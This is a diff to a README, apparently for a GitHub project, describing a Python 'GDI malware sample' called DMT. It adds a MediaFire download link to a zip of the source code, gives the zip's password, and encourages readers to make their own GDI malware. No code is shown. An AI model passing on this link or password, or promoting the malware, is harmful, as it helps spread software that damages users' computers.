@@ -1,4 +1,4 @@
-# DMT | Zip Password: penis | 
+# DMT | Zip Password: penis | Download Link: https://www.mediafire.com/file/1hxlgt77q73fq3e/DMT_source_code.zip/file
 DMT is a gdi malware sample I made in 6 weeks 6 days in python nothing special and donno what to do with it so Im going to upload the source code on github so
 more people make gdi malware cuz its cool I guess also you will need to pip install a lot of shit I dont know how much but I do know you need pywin32, winapy,
 and opencv. That is all I know because when I made it I had way to many libaries installed and Im right now doing this very fast so Im not going to check
